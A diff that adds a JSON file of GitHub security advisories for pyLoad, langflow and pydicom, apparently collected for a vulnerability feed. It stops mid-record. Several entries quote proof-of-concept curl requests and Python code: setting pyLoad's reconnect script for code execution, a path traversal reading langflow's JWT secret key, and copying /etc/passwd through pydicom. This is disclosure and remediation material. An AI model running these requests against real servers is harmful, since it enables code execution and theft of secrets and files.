@@ -1,0 +1,2332 @@
+[
+  {
+    "id": "GHSA-r7mc-x6x7-cqxx",
+    "source": "github",
+    "type": "advisory",
+    "title": "pyLoad SETTINGS Permission Users Can Achieve Remote Code Execution via Unrestricted Reconnect Script",
+    "description": "## Summary\n\nThe `set_config_value()` API endpoint allows users with the non-admin `SETTINGS` permission to modify any configuration option without restriction. The `reconnect.script` config option controls a file path that is passed directly to `subprocess.run()` in the thread manager's reconnect logic. A SETTINGS user can set this to any executable file on the system, achieving Remote Code Execution. The only validation in `set_config_value()` is a hardcoded check for `general.storage_folder` —",
+    "severity": "high",
+    "published_at": "2026-03-20T21:50:30Z",
+    "attack_patterns": [
+      "execute",
+      "remote",
+      "code",
+      "privilege",
+      "escalation",
+      "path"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-r7mc-x6x7-cqxx",
+      "cve_id": "CVE-2026-33509",
+      "url": "https://api.github.com/advisories/GHSA-r7mc-x6x7-cqxx",
+      "html_url": "https://github.com/advisories/GHSA-r7mc-x6x7-cqxx",
+      "summary": "pyLoad SETTINGS Permission Users Can Achieve Remote Code Execution via Unrestricted Reconnect Script Configuration",
+      "description": "## Summary\n\nThe `set_config_value()` API endpoint allows users with the non-admin `SETTINGS` permission to modify any configuration option without restriction. The `reconnect.script` config option controls a file path that is passed directly to `subprocess.run()` in the thread manager's reconnect logic. A SETTINGS user can set this to any executable file on the system, achieving Remote Code Execution. The only validation in `set_config_value()` is a hardcoded check for `general.storage_folder` — all other security-critical settings including `reconnect.script` are writable without any allowlist or path restriction.\n\n## Details\n\nThe vulnerability chain spans two components:\n\n**1. Unrestricted config write — `src/pyload/core/api/__init__.py:210-243`**\n\n```python\n@permission(Perms.SETTINGS)\n@post\ndef set_config_value(self, category: str, option: str, value: Any, section: str = \"core\") -> None:\n    self.pyload.addon_manager.dispatch_event(\n        \"config_changed\", category, option, value, section\n    )\n    if section == \"core\":\n        if category == \"general\" and option == \"storage_folder\":\n            # Forbid setting the download folder inside dangerous locations\n            # ... validation only for storage_folder ...\n            return\n\n        self.pyload.config.set(category, option, value)  # No validation for any other option\n```\n\nThe `Perms.SETTINGS` permission (value 128) is a non-admin permission flag. The only hardcoded validation is for `general.storage_folder`. The `reconnect.script` option is written directly to config with no path validation, allowlist, or sanitization.\n\n**2. Arbitrary script execution — `src/pyload/core/managers/thread_manager.py:157-199`**\n\n```python\ndef try_reconnect(self):\n    if not (\n        self.pyload.config.get(\"reconnect\", \"enabled\")\n        and self.pyload.api.is_time_reconnect()\n    ):\n        return False\n\n    # ... checks if active downloads want reconnect ...\n\n    reconnect_script = self.pyload.config.get(\"reconnect\", \"script\")\n    if not os.path.isfile(reconnect_script):\n        self.pyload.config.set(\"reconnect\", \"enabled\", False)\n        self.pyload.log.warning(self._(\"Reconnect script not found!\"))\n        return\n\n    # ... reconnect logic ...\n\n    try:\n        subprocess.run(reconnect_script)  # Executes attacker-controlled path\n    except Exception:\n        # ...\n```\n\nThe `reconnect_script` value comes directly from config. The only check is `os.path.isfile()` — the file must exist but there is no allowlist, no path restriction, and no signature verification.\n\n**3. Attacker also controls timing via same SETTINGS permission**\n\nThe attacker can set `reconnect.enabled=True`, `reconnect.start_time`, and `reconnect.end_time` through the same `set_config_value()` endpoint to control when execution occurs. `toggle_reconnect()` at line 321 requires only `Perms.STATUS` — an even lower privilege.\n\n**4. Additional privilege escalation via config access**\n\nBeyond RCE, the same unrestricted config write allows SETTINGS users to:\n- Read proxy credentials (`proxy.username`/`proxy.password`) in plaintext via `get_config()`\n- Redirect syslog to an attacker-controlled server (`log.syslog_host`/`log.syslog_port`)\n- Disable SSL (`webui.use_ssl=False`), rebind to `0.0.0.0` (`webui.host`)\n- Modify SSL certificate/key paths to enable MITM\n\n## PoC\n\n**Step 1: Set reconnect script to an attacker-controlled executable**\n\nVia API:\n```bash\n# Authenticate and get session (as user with SETTINGS permission)\ncurl -c cookies.txt -X POST 'http://target:8000/api/login' \\\n  -d 'username=settingsuser&password=pass123'\n\n# Set reconnect script to a known executable on the system\ncurl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \\\n  -d 'category=reconnect&option=script&value=/tmp/exploit.sh&section=core'\n```\n\nVia Web UI:\n```bash\ncurl -b cookies.txt -X POST 'http://target:8000/json/save_config?category=core' \\\n  -d 'reconnect|script=/tmp/exploit.sh&reconnect|enabled=True'\n```\n\n**Step 2: Enable reconnect and set timing window**\n\n```bash\ncurl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \\\n  -d 'category=reconnect&option=enabled&value=True&section=core'\n\ncurl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \\\n  -d 'category=reconnect&option=start_time&value=00:00&section=core'\n\ncurl -b cookies.txt -X POST 'http://target:8000/api/set_config_value' \\\n  -d 'category=reconnect&option=end_time&value=23:59&section=core'\n```\n\n**Step 3: Script executes when thread manager calls `try_reconnect()`**\n\nThe thread manager's `run()` method (called repeatedly by the core loop) invokes `try_reconnect()`, which calls `subprocess.run(reconnect_script)` at `thread_manager.py:199`.\n\n**Note on exploitation constraints:** The file at the target path must exist (`os.path.isfile()` check) and be executable. With `shell=False` (subprocess.run default), no arguments are passed. If the attacker also has `ADD` permission (common for non-admin users), they can use pyLoad to download an archive containing an executable script, which may retain execute permissions after extraction.\n\n## Impact\n\n- **Remote Code Execution**: A non-admin user with SETTINGS permission can execute arbitrary programs on the server as the pyLoad process user\n- **Privilege escalation**: The SETTINGS permission is described as \"can access settings\" — granting it is not expected to grant arbitrary code execution capability\n- **Credential exposure**: SETTINGS users can read proxy credentials, SSL key paths, and other sensitive config values via `get_config()`\n- **Network reconfiguration**: SETTINGS users can disable SSL, change bind address, redirect logging, and modify other security-critical network settings\n\n## Recommended Fix\n\nAdd an allowlist or category-level restriction in `set_config_value()` that prevents non-admin users from modifying security-critical options:\n\n```python\n# In set_config_value(), after the storage_folder check:\nADMIN_ONLY_OPTIONS = {\n    (\"reconnect\", \"script\"),\n    (\"webui\", \"host\"),\n    (\"webui\", \"use_ssl\"),\n    (\"webui\", \"ssl_cert\"),\n    (\"webui\", \"ssl_key\"),\n    (\"log\", \"syslog_host\"),\n    (\"log\", \"syslog_port\"),\n    (\"proxy\", \"username\"),\n    (\"proxy\", \"password\"),\n}\n\nif section == \"core\" and (category, option) in ADMIN_ONLY_OPTIONS:\n    # Require ADMIN role for security-critical settings\n    if not self.pyload.api.user_data.get(\"role\") == Role.ADMIN:\n        raise PermissionError(f\"Admin role required to modify {category}.{option}\")\n```\n\nAdditionally, consider validating the `reconnect.script` path against an allowlist of directories or requiring admin approval for script path changes.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-r7mc-x6x7-cqxx",
+      "source_code_location": "https://github.com/pyload/pyload",
+      "identifiers": [
+        {
+          "value": "GHSA-r7mc-x6x7-cqxx",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33509",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/pyload/pyload/security/advisories/GHSA-r7mc-x6x7-cqxx",
+        "https://github.com/pyload/pyload/commit/f5e284fcdfeaf08436bb03e5fcf697aaac659d8b",
+        "https://github.com/advisories/GHSA-r7mc-x6x7-cqxx"
+      ],
+      "published_at": "2026-03-20T21:50:30Z",
+      "updated_at": "2026-03-20T21:50:31Z",
+      "github_reviewed_at": "2026-03-20T21:50:30Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "pyload-ng"
+          },
+          "vulnerable_version_range": ">= 0.4.0, <= 0.5.0b3.dev96",
+          "first_patched_version": null,
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-269",
+          "name": "Improper Privilege Management"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "restriction",
+            "id": 114768995,
+            "node_id": "U_kgDOBtc8Yw",
+            "avatar_url": "https://avatars.githubusercontent.com/u/114768995?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/restriction",
+            "html_url": "https://github.com/restriction",
+            "followers_url": "https://api.github.com/users/restriction/followers",
+            "following_url": "https://api.github.com/users/restriction/following{/other_user}",
+            "gists_url": "https://api.github.com/users/restriction/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/restriction/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/restriction/subscriptions",
+            "organizations_url": "https://api.github.com/users/restriction/orgs",
+            "repos_url": "https://api.github.com/users/restriction/repos",
+            "events_url": "https://api.github.com/users/restriction/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/restriction/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 7.5
+      }
+    }
+  },
+  {
+    "id": "GHSA-ph9w-r52h-28p7",
+    "source": "github",
+    "type": "advisory",
+    "title": "langflow: /profile_pictures/{folder_name}/{file_name} endpoint file reading",
+    "description": "### Summary\nIn the download_profile_picture function of the /profile_pictures/{folder_name}/{file_name} endpoint, the folder_name and file_name parameters are not strictly filtered, which allows the secret_key to be read across directories.\n\n### Details\nsrc/backend/base/langflow/api/v1/files.py\n\n![image](https://github.com/user-attachments/assets/19bc387c-93d8-475b-bab0-2675669c1c36)\n\nstorage local get_file, directly concatenate flow_id and file_name\n![image](https://github.com/user-attachments/",
+    "severity": "high",
+    "published_at": "2026-03-20T20:56:14Z",
+    "attack_patterns": [
+      "path"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-ph9w-r52h-28p7",
+      "cve_id": "CVE-2026-33497",
+      "url": "https://api.github.com/advisories/GHSA-ph9w-r52h-28p7",
+      "html_url": "https://github.com/advisories/GHSA-ph9w-r52h-28p7",
+      "summary": "langflow: /profile_pictures/{folder_name}/{file_name} endpoint file reading",
+      "description": "### Summary\nIn the download_profile_picture function of the /profile_pictures/{folder_name}/{file_name} endpoint, the folder_name and file_name parameters are not strictly filtered, which allows the secret_key to be read across directories.\n\n### Details\nsrc/backend/base/langflow/api/v1/files.py\n\n![image](https://github.com/user-attachments/assets/19bc387c-93d8-475b-bab0-2675669c1c36)\n\nstorage local get_file, directly concatenate flow_id and file_name\n![image](https://github.com/user-attachments/assets/daf47b73-6e1b-414e-bb8b-66b67cf5a9e9)\n\n### PoC\n```curl --path-as-is 'http://127.0.0.1:7860/api/v1/files/profile_pictures/../secret_key' ```\n```QNuonm***********```\n\n### Impact\nsecret_key is used for jwt authentication. Attackers can forge authentication tokens and log into the system.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/langflow-ai/langflow/security-advisories/GHSA-ph9w-r52h-28p7",
+      "source_code_location": "https://github.com/langflow-ai/langflow",
+      "identifiers": [
+        {
+          "value": "GHSA-ph9w-r52h-28p7",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33497",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/langflow-ai/langflow/security/advisories/GHSA-ph9w-r52h-28p7",
+        "https://github.com/advisories/GHSA-ph9w-r52h-28p7"
+      ],
+      "published_at": "2026-03-20T20:56:14Z",
+      "updated_at": "2026-03-20T20:56:17Z",
+      "github_reviewed_at": "2026-03-20T20:56:14Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "langflow"
+          },
+          "vulnerable_version_range": "< 1.7.1",
+          "first_patched_version": "1.7.1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+          "score": 8.7
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "r00tuser111",
+            "id": 22544959,
+            "node_id": "MDQ6VXNlcjIyNTQ0OTU5",
+            "avatar_url": "https://avatars.githubusercontent.com/u/22544959?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/r00tuser111",
+            "html_url": "https://github.com/r00tuser111",
+            "followers_url": "https://api.github.com/users/r00tuser111/followers",
+            "following_url": "https://api.github.com/users/r00tuser111/following{/other_user}",
+            "gists_url": "https://api.github.com/users/r00tuser111/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/r00tuser111/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/r00tuser111/subscriptions",
+            "organizations_url": "https://api.github.com/users/r00tuser111/orgs",
+            "repos_url": "https://api.github.com/users/r00tuser111/repos",
+            "events_url": "https://api.github.com/users/r00tuser111/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/r00tuser111/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        },
+        {
+          "user": {
+            "login": "erichare",
+            "id": 700235,
+            "node_id": "MDQ6VXNlcjcwMDIzNQ==",
+            "avatar_url": "https://avatars.githubusercontent.com/u/700235?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/erichare",
+            "html_url": "https://github.com/erichare",
+            "followers_url": "https://api.github.com/users/erichare/followers",
+            "following_url": "https://api.github.com/users/erichare/following{/other_user}",
+            "gists_url": "https://api.github.com/users/erichare/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/erichare/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/erichare/subscriptions",
+            "organizations_url": "https://api.github.com/users/erichare/orgs",
+            "repos_url": "https://api.github.com/users/erichare/repos",
+            "events_url": "https://api.github.com/users/erichare/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/erichare/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer"
+        },
+        {
+          "user": {
+            "login": "AntonioABLima",
+            "id": 104531655,
+            "node_id": "U_kgDOBjsGxw",
+            "avatar_url": "https://avatars.githubusercontent.com/u/104531655?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/AntonioABLima",
+            "html_url": "https://github.com/AntonioABLima",
+            "followers_url": "https://api.github.com/users/AntonioABLima/followers",
+            "following_url": "https://api.github.com/users/AntonioABLima/following{/other_user}",
+            "gists_url": "https://api.github.com/users/AntonioABLima/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/AntonioABLima/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/AntonioABLima/subscriptions",
+            "organizations_url": "https://api.github.com/users/AntonioABLima/orgs",
+            "repos_url": "https://api.github.com/users/AntonioABLima/repos",
+            "events_url": "https://api.github.com/users/AntonioABLima/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/AntonioABLima/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "analyst"
+        }
+      ],
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    }
+  },
+  {
+    "id": "GHSA-7grx-3xcx-2xv5",
+    "source": "github",
+    "type": "advisory",
+    "title": "langflow has Unauthenticated IDOR on Image Downloads",
+    "description": "### Summary\nThe `/api/v1/files/images/{flow_id}/{file_name}` endpoint serves image files without any authentication or ownership check. Any unauthenticated request with a known flow_id and file_name returns the image with HTTP 200.\n\n### Details\n`src/backend/base/langflow/api/v1/files.py:138-164` — `download_image` takes `flow_id`: UUID as a bare path parameter with no Depends(get_flow) or `CurrentActiveUser`. All other file routes (`download_file`, `upload_file`, `list_files`, `delete_file`) use",
+    "severity": "high",
+    "published_at": "2026-03-20T20:47:10Z",
+    "attack_patterns": [
+      "upload",
+      "path"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-7grx-3xcx-2xv5",
+      "cve_id": "CVE-2026-33484",
+      "url": "https://api.github.com/advisories/GHSA-7grx-3xcx-2xv5",
+      "html_url": "https://github.com/advisories/GHSA-7grx-3xcx-2xv5",
+      "summary": "langflow has Unauthenticated IDOR on Image Downloads",
+      "description": "### Summary\nThe `/api/v1/files/images/{flow_id}/{file_name}` endpoint serves image files without any authentication or ownership check. Any unauthenticated request with a known flow_id and file_name returns the image with HTTP 200.\n\n### Details\n`src/backend/base/langflow/api/v1/files.py:138-164` — `download_image` takes `flow_id`: UUID as a bare path parameter with no Depends(get_flow) or `CurrentActiveUser`. All other file routes (`download_file`, `upload_file`, `list_files`, `delete_file`) use `Depends(get_flow)` which enforces both authentication and ownership. There is no global auth middleware on /api/v1; protection is per-endpoint only.\n\n### PoC\n```\ncurl -v \"http://localhost:7860/api/v1/files/images/<flow_uuid>/<filename.png>\"\n# Returns HTTP 200 with image bytes, no auth header required\n```\n\n### Impact\nUnauthenticated cross-tenant data leak. In a multi-tenant deployment, any attacker who can discover or guess a `flow_id` (UUIDs can be leaked through other API responses) can download any user's uploaded images without credentials.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/langflow-ai/langflow/security-advisories/GHSA-7grx-3xcx-2xv5",
+      "source_code_location": "https://github.com/langflow-ai/langflow",
+      "identifiers": [
+        {
+          "value": "GHSA-7grx-3xcx-2xv5",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33484",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/langflow-ai/langflow/security/advisories/GHSA-7grx-3xcx-2xv5",
+        "https://github.com/advisories/GHSA-7grx-3xcx-2xv5"
+      ],
+      "published_at": "2026-03-20T20:47:10Z",
+      "updated_at": "2026-03-20T20:47:12Z",
+      "github_reviewed_at": "2026-03-20T20:47:10Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "langflow"
+          },
+          "vulnerable_version_range": ">= 1.0.0, <= 1.8.1",
+          "first_patched_version": null,
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-284",
+          "name": "Improper Access Control"
+        },
+        {
+          "cwe_id": "CWE-639",
+          "name": "Authorization Bypass Through User-Controlled Key"
+        },
+        {
+          "cwe_id": "CWE-862",
+          "name": "Missing Authorization"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "akshatgit",
+            "id": 11229971,
+            "node_id": "MDQ6VXNlcjExMjI5OTcx",
+            "avatar_url": "https://avatars.githubusercontent.com/u/11229971?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/akshatgit",
+            "html_url": "https://github.com/akshatgit",
+            "followers_url": "https://api.github.com/users/akshatgit/followers",
+            "following_url": "https://api.github.com/users/akshatgit/following{/other_user}",
+            "gists_url": "https://api.github.com/users/akshatgit/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/akshatgit/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/akshatgit/subscriptions",
+            "organizations_url": "https://api.github.com/users/akshatgit/orgs",
+            "repos_url": "https://api.github.com/users/akshatgit/repos",
+            "events_url": "https://api.github.com/users/akshatgit/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/akshatgit/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        },
+        {
+          "user": {
+            "login": "abhinavagarwal07",
+            "id": 8086316,
+            "node_id": "MDQ6VXNlcjgwODYzMTY=",
+            "avatar_url": "https://avatars.githubusercontent.com/u/8086316?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/abhinavagarwal07",
+            "html_url": "https://github.com/abhinavagarwal07",
+            "followers_url": "https://api.github.com/users/abhinavagarwal07/followers",
+            "following_url": "https://api.github.com/users/abhinavagarwal07/following{/other_user}",
+            "gists_url": "https://api.github.com/users/abhinavagarwal07/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/abhinavagarwal07/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/abhinavagarwal07/subscriptions",
+            "organizations_url": "https://api.github.com/users/abhinavagarwal07/orgs",
+            "repos_url": "https://api.github.com/users/abhinavagarwal07/repos",
+            "events_url": "https://api.github.com/users/abhinavagarwal07/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/abhinavagarwal07/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_reviewer"
+        },
+        {
+          "user": {
+            "login": "andifilhohub",
+            "id": 115162146,
+            "node_id": "U_kgDOBt08Ig",
+            "avatar_url": "https://avatars.githubusercontent.com/u/115162146?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/andifilhohub",
+            "html_url": "https://github.com/andifilhohub",
+            "followers_url": "https://api.github.com/users/andifilhohub/followers",
+            "following_url": "https://api.github.com/users/andifilhohub/following{/other_user}",
+            "gists_url": "https://api.github.com/users/andifilhohub/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/andifilhohub/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/andifilhohub/subscriptions",
+            "organizations_url": "https://api.github.com/users/andifilhohub/orgs",
+            "repos_url": "https://api.github.com/users/andifilhohub/repos",
+            "events_url": "https://api.github.com/users/andifilhohub/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/andifilhohub/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      }
+    }
+  },
+  {
+    "id": "GHSA-v856-2rf8-9f28",
+    "source": "github",
+    "type": "advisory",
+    "title": "pydicom has a path traversal in FileSet/DICOMDIR ReferencedFileID allows file access outside the Fil",
+    "description": "### Summary\nA crafted `DICOMDIR` can set `ReferencedFileID` to a path outside the File-set root. `pydicom` resolves the path only to confirm that it exists, but does not verify that the resolved path remains under the File-set root. Subsequent public `FileSet` operations such as `copy()`, `write()`, and `remove()+write(use_existing=True)` use that unchecked path in file I/O operations. This allows arbitrary file read/copy and, in some flows, move/delete outside the File-set root.\n\n### Details\nVe",
+    "severity": "high",
+    "published_at": "2026-03-20T15:57:01Z",
+    "attack_patterns": [
+      "bypass",
+      "upload",
+      "path",
+      "traversal"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-v856-2rf8-9f28",
+      "cve_id": "CVE-2026-32711",
+      "url": "https://api.github.com/advisories/GHSA-v856-2rf8-9f28",
+      "html_url": "https://github.com/advisories/GHSA-v856-2rf8-9f28",
+      "summary": "pydicom has a path traversal in FileSet/DICOMDIR ReferencedFileID allows file access outside the File-set root",
+      "description": "### Summary\nA crafted `DICOMDIR` can set `ReferencedFileID` to a path outside the File-set root. `pydicom` resolves the path only to confirm that it exists, but does not verify that the resolved path remains under the File-set root. Subsequent public `FileSet` operations such as `copy()`, `write()`, and `remove()+write(use_existing=True)` use that unchecked path in file I/O operations. This allows arbitrary file read/copy and, in some flows, move/delete outside the File-set root.\n\n### Details\nVerified on `pydicom 3.1.0.dev0`.\n\nRelevant logic is in `src/pydicom/fileset.py`:\n\n- `RecordNode._file_id` converts `ReferencedFileID` directly to `Path(...)`\n- `FileSet.load()` checks only `(root / file_id).resolve(strict=True)` to confirm existence\n- `FileSet.load()` does not verify that the final resolved path is contained within the File-set root\n- `FileInstance.path` returns `self.file_set.path / self.node._file_id`\n- `FileSet.copy()` uses `shutil.copyfile(instance.path, dst)`\n- `FileSet.write()` uses `Path(instance.path).unlink()` and `shutil.move(...)`\n\nBecause there is no containment check such as `resolved.relative_to(root.resolve(strict=True))`, a malicious `DICOMDIR` can reference:\n\n- absolute paths such as `/etc/passwd`\n- traversal paths such as `../...`\n- syntactically conformant file IDs that escape via symlinks\n\nThis is not limited to obviously invalid VR input. Even when `pydicom` emits warnings for invalid `ReferencedFileID` values, the operation is not blocked. I also confirmed a symlink-based variant using a conformant file ID.\n\nA realistic server-side scenario is:\n\n1. a user uploads a DICOM File-set zip\n2. the server loads the uploaded `DICOMDIR` using `FileSet`\n3. the server re-exports or reorganizes the File-set using `FileSet.copy()` or `FileSet.write()`\n4. a server-local file referenced by the malicious `DICOMDIR` is included in the exported result\n\n### PoC\nMinimal reproduction:\n\n1. Copy a sample File-set that contains a valid `DICOMDIR`\n2. Modify one `DirectoryRecordSequence` item so that `ReferencedFileID = \"/etc/passwd\"` (or `/tmp/secret.txt`)\n3. Load it with `FileSet(ds)` or `FileSet(path_to_dicomdir)`\n4. Call `FileSet.copy(new_root)`\n5. Observe that the exported File-set contains the contents of the referenced external file\n\nExample:\n\n```python\nfrom pathlib import Path\nfrom tempfile import mkdtemp\nimport shutil\nfrom pydicom import dcmread\nfrom pydicom.fileset import FileSet\n\nbase = Path(\"src/pydicom/data/test_files/dicomdirtests\")\nroot = Path(mkdtemp(prefix=\"fsroot_\"))\nout = Path(mkdtemp(prefix=\"fsout_\"))\n\nshutil.copy2(base / \"DICOMDIR\", root / \"DICOMDIR\")\nfor d in (\"77654033\", \"98892003\", \"98892001\"):\n    shutil.copytree(base / d, root / d)\n\nds = dcmread(root / \"DICOMDIR\")\nitem = next(x for x in ds.DirectoryRecordSequence if \"ReferencedFileID\" in x)\nitem.ReferencedFileID = \"/etc/passwd\"\n\nfs = FileSet(ds)\nfs.copy(out)\n```\n\nI also verified the issue in a simple web import/export demo where an uploaded malicious File-set caused /etc/passwd to be copied into the exported result.\n\nIf useful, I can provide the exact malicious sample and the demo environment separately.\n\n### Impact\nThis is a path traversal / root containment bypass in FileSet handling.\n\nObserved impact:\n\narbitrary file read/copy outside the File-set root via FileSet.copy()\narbitrary file move outside the File-set root via FileSet.write()\narbitrary file delete outside the File-set root via FileSet.remove(...); write(use_existing=True)\nAffected applications are those that accept untrusted DICOMDIR / File-set input and then call public FileSet workflows such as load(), copy(), write(), or remove().\n\nA realistic impact is server-side file disclosure in import/export workflows.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/pydicom/pydicom/security-advisories/GHSA-v856-2rf8-9f28",
+      "source_code_location": "https://github.com/pydicom/pydicom",
+      "identifiers": [
+        {
+          "value": "GHSA-v856-2rf8-9f28",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-32711",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/pydicom/pydicom/security/advisories/GHSA-v856-2rf8-9f28",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-32711",
+        "https://github.com/pydicom/pydicom/commit/6414f01a053dff925578799f5a7208d2ae585e82",
+        "https://github.com/pydicom/pydicom/releases/tag/v3.0.2",
+        "https://github.com/advisories/GHSA-v856-2rf8-9f28"
+      ],
+      "published_at": "2026-03-20T15:57:01Z",
+      "updated_at": "2026-03-20T15:57:02Z",
+      "github_reviewed_at": "2026-03-20T15:57:01Z",
+      "nvd_published_at": "2026-03-20T02:16:33Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "pydicom"
+          },
+          "vulnerable_version_range": ">= 3.0.0, <= 3.0.1",
+          "first_patched_version": "3.0.2",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "pydicom"
+          },
+          "vulnerable_version_range": "< 2.4.5",
+          "first_patched_version": "2.4.5",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+          "score": 7.8
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "jh4nks",
+            "id": 54920329,
+            "node_id": "MDQ6VXNlcjU0OTIwMzI5",
+            "avatar_url": "https://avatars.githubusercontent.com/u/54920329?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/jh4nks",
+            "html_url": "https://github.com/jh4nks",
+            "followers_url": "https://api.github.com/users/jh4nks/followers",
+            "following_url": "https://api.github.com/users/jh4nks/following{/other_user}",
+            "gists_url": "https://api.github.com/users/jh4nks/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/jh4nks/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/jh4nks/subscriptions",
+            "organizations_url": "https://api.github.com/users/jh4nks/orgs",
+            "repos_url": "https://api.github.com/users/jh4nks/repos",
+            "events_url": "https://api.github.com/users/jh4nks/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/jh4nks/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
